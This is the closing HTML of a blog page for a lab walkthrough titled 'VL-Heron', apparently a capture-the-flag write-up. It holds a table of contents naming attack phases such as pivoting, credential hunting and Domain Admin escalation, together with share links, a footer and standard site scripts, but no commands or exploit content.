+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access"><span class="toc-number">1.</span> <span class="toc-text">Initial Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Pivoting-with-Ligolo-NG"><span class="toc-number">2.</span> <span class="toc-text">Network Pivoting with Ligolo-NG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Enumeration"><span class="toc-number">3.</span> <span class="toc-text">Web Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Enumeration-and-Authentication"><span class="toc-number">4.</span> <span class="toc-text">User Enumeration and Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB-Enumeration"><span class="toc-number">5.</span> <span class="toc-text">SMB Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Application-Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Web Application Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">7.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credential-Hunting-as-svc-web-accounting"><span class="toc-number">8.</span> <span class="toc-text">Credential Hunting as svc-web-accounting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-via-Linux-Machine"><span class="toc-number">9.</span> <span class="toc-text">Lateral Movement via Linux Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Admin-Privilege-Escalation"><span class="toc-number">10.</span> <span class="toc-text">Domain Admin Privilege Escalation</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/04/15/VL-Heron/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&text=VL-Heron"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&is_video=false&description=VL-Heron"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Heron&body=Check out this article: https://panosoikogr.github.io/2025/04/15/VL-Heron/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&title=VL-Heron"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/04/15/VL-Heron/&name=VL-Heron&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/04/15/VL-Heron/&t=VL-Heron"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
